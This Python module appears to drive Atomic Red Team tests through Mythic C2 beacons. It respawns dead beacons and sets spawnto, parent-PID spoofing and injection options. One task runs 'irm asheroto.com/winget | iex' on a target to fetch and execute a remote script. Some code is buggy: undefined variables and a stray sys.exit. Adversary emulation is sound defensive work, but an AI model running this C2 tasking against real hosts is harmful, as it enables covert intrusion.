"""
Interface for defining an executable API
"""
from abc import ABC, abstractmethod
from Command import Command
import logs
from mythic import mythic
import re
import sys

class Executable(ABC):
    @abstractmethod
    def execute_task(self):
        pass

    """
    ART will check if a file exists in some prereqs by running something similar to `if (Test-Path "#{file}") {exit 0} else {exit 1}`.
    This doesn't really work with C2 tasking, so replace it with "echo Test Passed" and "echo Test Failed".
    Process arguments from the yaml

    Returns the new command (string) and updated executor (string)
    """
    @abstractmethod
    def clean_cmd(self):
        pass

    """
    Need to determine if there is a special execution technique assoicated with the given command
    """
    @abstractmethod
    def preprocess_cmd(self):
        pass
    """
    ART will check if a file exists in some prereqs by running something similar to `if (Test-Path "#{file}") {exit 0} else {exit 1}`.
    This doesn't really work with C2 tasking, so replace it with "echo Test Passed" and "echo Test Failed".
    Process arguments from the yaml

    Returns the new command (string) and updated executor (string)
    """
    @abstractmethod
    def strip_args(self):
        pass

    @abstractmethod
    def log_write(self):
        pass

    @abstractmethod
    def log_error(self):
        pass

class IMythic(Executable):
    def __init__(self, atomics_folder, logfile, binary_path, execution_config, payload_config):
        self.api = "Mythic"
        self.atomics_folder = atomics_folder
        self.logger = logs.Logger(logfile)
        self.binary_path = binary_path
        self.execution_config = execution_config
        self.payload_config = payload_config
        self.pe_whitelist = []
        self.dotnet_whitelist = []
        self.powershell_whitelist = []
        # Get the commands to use special execution on
        with open(self.payload_config['PEsFile'], 'r') as f:
            for line in f:
                self.pe_whitelist.append(line.strip())

        with open(self.payload_config['DotnetsFile'], 'r') as f:
            for line in f:
                self.dotnet_whitelist.append(line.strip())

        with open(self.payload_config['PowershellFile'], 'r') as f:
            for line in f:
                self.powershell_whitelist.append(line.strip())

    # Login
    async def login(self, username, password):
        self.api_instance = await mythic.login(
            username=username,
            password=password,
            server_ip="localhost",
            server_port=7443,
            timeout=-1
        )
        if self.api_instance is None:
            raise Exception(f"Could not login to Mythic at {server_ip}:{server_port} with {username}:{password}")
        


    # Update callback info to reflect health and hierarchical status (parent or child)
    async def update_all_callback_health(self):
        # Get all callbacks
        callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)

        for c in callbacks:
            # Get health status
            health = await self.check_beacon_health(c['display_id'])
            # Update callback
            await mythic.update_callback(
                mythic=self.api_instance,
                callback_display_id=c['display_id'],
                description=f"Parent Callback - {health}" if c['display_id'] == self.parent_callback_id else f"Child Callback - {health}" if c['display_id'] == self.child_callback_id else f"Standby Callback - {health}", # le epic chained ternary operator
                locked=True,
                domain=c['domain'],
                integrity_level=c['integrity_level'],
                host=c['host'],
                user=c['user']
            )
            # If the child is dead, spawn a new one
            if c['display_id'] == self.child_callback_id and "Dead" in health:
                print("[-] Dead child beacon found, spawning new beacon...")
                await self.spawn_beacon(self.binary_path)
                await self.get_child_callback(c['host'], 0)
                # TODO add this callback to the list so it keep iterating
                t_callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)
                callbacks.append(t_callbacks[-1])

    async def update_callback_health(self, display_id, description):
        await mythic.update_callback(
            mythic=self.api_instance,
            callback_display_id=c['display_id'],
            description=description,
            locked=True,
            domain=c['domain'],
            integrity_level=c['integrity_level'],
            host=c['host'],
            user=c['user']
        )

    # Used for a post-test check
    async def manage_beacon_health(self, hostname):
        print(f"[*] Checking beacon health...")
        # Get all callbacks
        callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)
        # Get list of living standby callbacks
        standbys = [x for x in callbacks if "Standby Callback - Alive" in x['description']] # le epic list comprehension - epic python dev

        # Test the child
        health = await self.check_beacon_health(self.child_callback_id)

        if health == "Dead":
            print(f"[-] Child appears dead, checking for standby beacons..")
            # Update old child to dead
            await mythic.update_callback(
                mythic=self.api_instance,
                callback_display_id=self.child_callback_id,
                description="Child Callback - Dead",
            )
            if len(standbys) >= 1:
                new_child = standbys[-1]
                print(f"[+] Assigning callback ID: {standbys[-1]['display_id']} to child beacon")
                # Update standby to become the new child
                self.child_callback_id = new_child['display_id']
                await mythic.update_callback(
                    mythic=self.api_instance,
                    callback_display_id=new_child['display_id'],
                    description="Child Callback - Alive",
                )

            # If list is empty, spawn a new beacon 
            if len(standbys) < 1:
                print("[-] No standby beacons found, attempting to spawn a new child beacon...")
                try:
                    # will spawn a beacon and update self variables
                    await self.get_child_callback(hostname, 0)
                    # Test health of the new child
                    health = await self.check_beacon_health(self.child_callback_id)
                    if health != "Alive":
                        print(f"[-] Child beacon is dead, checking health of parent...")
                    else:
                        return

                except Exception as e:
                    print(f"[-] Could not spawn a child beacon, checking health of parent...")
                    print(e)

        else:
            print(f"[+] Child beacon healthy")

        # Check the health of the parent
        health = await self.check_beacon_health(self.parent_callback_id)
        if health == "Alive":
            print(f"[+] Parent beacon healthy")
        else:
            print(f"[-] Parent beacon dead, likely caught by blue team")
            raise Exception("Parent beacon dead")

    # TODO this only works for windows
    # Runs test, returns "Alive" if the output succeeded
    # Used for a single beacon
    async def check_beacon_health(self, display_id):
        # Always use powershell for the health check, powerpick makes it fail too much
        command = Command('powershell', 'echo "Test Passed"', 'Windows Beacon Health Check', 'None', 'Windows Beacon Health Check', ['windows'], 20, '') # TODO, this timeout should be dynamic
        output = 'Test Failed'
        try:
            task = await mythic.issue_task(
                mythic=self.api_instance,
                command_name=command.ex_technique,
                parameters=command.parameters,
                callback_display_id=display_id,
                timeout=command.timeout,
                wait_for_complete=True,
            )
            # Idk some version of python doesnt support this in a format string, idk
            p = task['original_params'].strip('\n')
            print(f"[*] Issued a task: '{task['command_name']} {p}' to callback ID {display_id}")


            output = await mythic.waitfor_for_task_output(
                mythic=self.api_instance, task_display_id=task["display_id"]        )
            output = output.decode('utf-8')
            self.log_write(task['original_params'], task['timestamp'], task['status'], "mythic", command.name, command.guid, command.description, command.platforms, command.ex_technique, command.timeout, self.child_callback_id, output)
            separator  = '-' * 20 # python gets mad if this is in the format string
            print(f"[*] Got output:\n{separator}\n{output}\n{separator}")

        except Exception as e:
            if 'command_name' in str(e):
                e = "Task timed out"
            self.log_error(command.name, command.guid, command.description, command.platforms, command.timeout, self.child_callback_id, str(e))
            print(f"[-] Got an exception trying to issue task: {command.ex_technique} {command.parameters} {str(e)}")

        return 'Alive' if 'Test Passed' in output else 'Dead'

    async def check_elevation(self, elevation_required):
        # Check the child beacon
        try:
            callback = await self.get_callback(self.child_callback_id)
            if elevation_required and callback['integrity_level'] < 3:
                return False
            return True
        except Exception as e:
            print(f"Error geting beacon callback for check_elevation -- {e}")

    async def check_platforms(self, platforms):
        try:
            callback = await self.get_callback(self.child_callback_id)
            if callback['payload']['os'].lower() not in platforms:
                return False
            return True
        except Exception as e:
            print(f"Error geting beacon callback for check_platforms -- {e}")

    # Get the callback ID, returns false if nothing found
    async def get_callback(self, display_id):
        callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)
        for c in callbacks:
            if c['display_id'] == display_id:
                return c
        raise Exception(f"No callback with ID: {display_id}")

    async def get_parent_callback(self, hostname):
        # Get all callback
        callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)

        # If there are no callbacks, exit with error
        if len(callbacks) == 0:
            raise Exception(f"No callbacks found on server")

        # Get first ID, set it to the parent, and return
        c_id = callbacks[0]['display_id']
        print(f"[+] Got parent callback at ID: {c_id}")
        self.parent_callback_id = c_id
        return c_id

    # Takes in an int (retry) for max retries of recursive loop
    # Will spawn a new child beacon if none is found
    async def get_child_callback(self, hostname, retry):
        retry = retry if retry >= 1 else 0

        if retry == 5:
            raise Exception("Could not spawn child process")

        # Get all callbacks, remove any dead callbacks
        callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)
        new_cid = callbacks[-1]['display_id'] + 1
        # lambda function to remove any dead callbacks based on the description
        condition = lambda x: "Dead" in x['description']
        callbacks = list(filter(lambda x: not condition(x), callbacks)) # le epic lambda function, this is readable

        # If are no callbacks, exit with an error
        if len(callbacks) == 0:
            raise Exception(f"No callbacks found on server")

        # If there is only one, spawn a new callback, recursively call method
        if len(callbacks) == 1:
            print("[-] No child beacon found, spawning new beacon...")
            self.child_callback_id = self.parent_callback_id
            await self.spawn_beacon(self.binary_path)
            await mythic.update_callback(
                mythic=self.api_instance,
                callback_display_id=new_cid,
                description="Child Callback - Alive",
            )
            await self.set_beacon_execution_config(new_cid)
            retry += 1
            await self.get_child_callback(hostname, retry)

        # If two or more callbacks, set the child callback id to the last callback in the list
        if len(callbacks) >= 2:
            self.child_callback_id = callbacks[-1]['display_id']
            print(f"[+] Got child callback at ID: {self.child_callback_id}")
            return

    async def spawn_beacon(self, binary_path):
        command = Command('shell', binary_path, 'Spawn new beacon', '00000', 'Spawn new beacon', ['windows'], 10, '')
        try:
            task = await mythic.issue_task(
                mythic=self.api_instance,
                command_name=command.ex_technique,
                parameters=command.parameters,
                callback_display_id=self.parent_callback_id,
                timeout=command.timeout,
                wait_for_complete=True,
            )

            p = task['original_params'].strip('\n')
            print(f"[*] Issued a task: '{task['command_name']} {p}' to callback ID {self.child_callback_id}")

        except Exception as e:
            # This happens on a timeout, spawning a new beacon never returns, therefore it will always time out
            if str(e) == "'original_params'":
                # Get newest callback id and update config
                callbacks = await mythic.get_all_active_callbacks(mythic=self.api_instance)
                c_id = callbacks[-1]['display_id']
            elif 'command_name' not in str(e) or "'original_params'" not in str(e):
                self.log_error(command.name, command.guid, command.description, command.platforms, command.timeout, self.child_callback_id, str(e))
                print(f"[-] Got an exception trying to spawn new beacon: {command.ex_technique} {command.parameters} {str(e)}")

    async def set_beacon_execution_config(self, callback_id):
        print(f"[*] Setting execution configuration for callback ID {callback_id}")
        # Set spawnto's
        command = Command('spawnto_x64', f'{self.execution_config["spawnto_x64"]} """', 'Set spawnto_x64', '0', f"Set spawnto_x64 to {self.execution_config['spawnto_x64']}", ['windows'], 30, '')
        await self.execute_task_by_callback(command, callback_id)
        command = Command('spawnto_x86', f'{self.execution_config["spawnto_x86"]} """', 'Set spawnto_x86', '0', f"Set spawnto_x86 to {self.execution_config['spawnto_x86']}", ['windows'], 30, '')
        await self.execute_task_by_callback(command, callback_id)

        # Set ppid if set
        if self.execution_config['ppid'] != "None":
            command = Command('ppid', f'-ppid {self.execution_config["ppid"]}', 'Set ppid', '0', f'Set ppid to {self.execution_config["ppid"]}', ['windows'], 30, '')
            await self.execute_task_by_callback(command, callback_id)

        # Set injection technique
        command = Command('set_injection_technique', self.execution_config["injection_technique"], 'Set injection technique', '0', f'Set injection technique to {self.execution_config["injection_technique"]}', ['windows'], 30, '')
        await self.execute_task_by_callback(command, callback_id)


    async def execute_task(self, command):
        # Create the task
        try:
            task = await mythic.issue_task(
                mythic=self.api_instance,
                command_name=command.ex_technique,
                parameters=command.parameters,
                callback_display_id=self.child_callback_id,
                timeout=command.timeout,
                wait_for_complete=True,
            )
            p = task['original_params'].strip('\n')
            print(f"[*] Issued a task: '{task['command_name']} {p}' to callback ID {self.child_callback_id}")

            output = await mythic.waitfor_for_task_output(
                mythic=self.api_instance, task_display_id=task["display_id"]        )
            output = output.decode('utf-8')
            self.log_write(task['original_params'], task['timestamp'], task['status'], "mythic", command.name, command.guid, command.description, command.platforms, command.ex_technique, command.timeout, self.child_callback_id, output)
            separator = "-" * 20
            print(f"[*] Got output:\n{separator}\n{output}\n{separator}")
            return output

        except Exception as e:
            if 'command_name' in str(e):
                e = "Task timed out"
            self.log_error(command.name, command.guid, command.description, command.platforms, command.timeout, self.child_callback_id, str(e))
            print(f"[-] Got an exception trying to issue task: {command.ex_technique} {command.parameters} {str(e)}")

    async def execute_task_by_callback(self, command, callback_id):
        # Create the task
        try:
            task = await mythic.issue_task(
                mythic=self.api_instance,
                command_name=command.ex_technique,
                parameters=command.parameters,
                callback_display_id=callback_id,
                timeout=command.timeout,
                wait_for_complete=True,
            )
            p = task['original_params'].strip('\n')
            print(f"[*] Issued a task: '{task['command_name']} {p}' to callback ID {callback_id}")

            output = await mythic.waitfor_for_task_output(
                mythic=self.api_instance, task_display_id=task["display_id"]        )
            output = output.decode('utf-8')
            self.log_write(task['original_params'], task['timestamp'], task['status'], "mythic", command.name, command.guid, command.description, command.platforms, command.ex_technique, command.timeout, callback_id, output)
            separator = "-" * 20
            print(f"[*] Got output:\n{separator}\n{output}\n{separator}")
            return output

        except Exception as e:
            if 'command_name' in str(e):
                e = "Task timed out"
            self.log_error(command.name, command.guid, command.description, command.platforms, command.timeout, callback_id, str(e))
            print(f"[-] Got an exception trying to issue task: {command.ex_technique} {command.parameters} {str(e)}")

    # Check if the binary in the cmd is in the whitelisted binaries
    def preprocess_cmd(self, cmd):
        print(cmd.parameters)
        for x in self.pe_whitelist:
            if x in cmd.parameters.split(' ')[0]:
                print(cmd.parameters.split(' ')[0])
                print(f"found {x} in params, time to do somethign else")

        sys.exit(0)

    # Mythic specific implementation
    def clean_cmd(self, cmd):
        if cmd.ex_technique == "command_prompt":
            cmd.set_ex_technique("shell")
        elif cmd.ex_technique == "powershell":
            cmd.set_ex_technique(self.execution_config['Powershell'])

        # Clean powershell
        cmd.set_parameters(cmd.parameters.replace('exit 1', 'echo \'Test Failed\''))
        cmd.set_parameters(cmd.parameters.replace('exit /b 1', 'echo "Test Failed"'))
        cmd.set_parameters(cmd.parameters.replace('exit 0', 'echo "Test Passed"'))

        # Kinda a hack, for some reason mythic doesnt return output for "powershell cmd /c <cmd>", so run it through "shell"
        if 'cmd /c' in cmd.parameters:
            cmd.set_ex_technique('shell')
            cmd.set_parameters(cmd.parameters[cmd.parameters.find('cmd /c')+6:])

        self.strip_args(cmd)
        # Replace defaults - if exist
        cmd.set_parameters(cmd.parameters.replace('PathToAtomicsFolder', self.atomics_folder))

    def strip_args(self, cmd):
        # Find all arguments in the yaml
        arguments = re.findall(r"\#{.*?}", cmd.parameters)
        for arg in arguments:
            # Get the value inside #{} to use as key
            a = ''.join(c for c in arg if c not in '#{}')
            # Get the default value of the argument
            cmd.set_parameters(cmd.parameters.replace(arg, str(cmd.args.get(a).get('default'))))

    def log_write(self, command, timestamp, status, api, name, guid, desc, platform, ex, timeout, callback_id, output):
        data = [
            {
                'command':command,
                'timestamp':timestamp,
                'status':status,
                'api':api,
                'name':name,
                'GUID':guid,
                'description':desc,
                'platform':platform,
                'executor':ex,
                'timeout':timeout,
                'callback_id':callback_id,
                'output':output
            }
        ]
        self.logger.log(data)

    # Used to log an error in CSV, notably, 'status' is "failed"
    def log_error(self, name, guid, desc, platforms, timeout, callback_id, err_str):
        data = [
            {
                'command':"None",
                'timestamp':"None",
                'status':"failed",
                'api':"mythic",
                'name':name,
                'GUID':guid,
                'description':desc,
                'platform':platforms,
                'executor':"None",
                'timeout':timeout,
                'callback_id':callback_id,
                'output':err_str
            }
        ]
        self.logger.log(data)

    # Some atomic prereqs assume winget is installed but don't have a backup if it isnt
    # So try to install it first :)
    # Optional TODO, instead of iex the install script, keep it in repo and upload it then run from beacon
    async def install_winget(self):
        print("[*] Checking for winget-cli installation")
        # Check if winget is installed
        cmd = Command(self.execution_config['Powershell'], 'if (Get-Command winget -ErrorAction SilentlyContinue) { echo "Test Passed" } else { echo "Test Failed" }', "Test for Install Winget", "None", "Test for Install Winget", "Windows", 120, "")
        self.clean_cmd(cmd)
        output = await self.execute_task(cmd)
        if "Test Passed" not in output:
            print("[-] winget not found. Installing...")
            # Install winget
            cmd = Command(self.execution_config['Powershell'], 'irm asheroto.com/winget | iex', "Install Winget", "None", "Install Winget", "windows", 120) # taken from https://github.com/asheroto/winget-install
            cmd, ex = self.clean_cmd(cmd, self.execution_config['Powershell'])
            output = await self.execute_task(cmd) # big ol timeout since it takes a while to install
            # Le epic recursive loop, surely this wont cause the program to fail if winget cant be installed from the script
            # If Test Passed is never in the output, this will recurse forever, lol
            await self.install_winget()
        print('[+] winget is installed :)')
        return
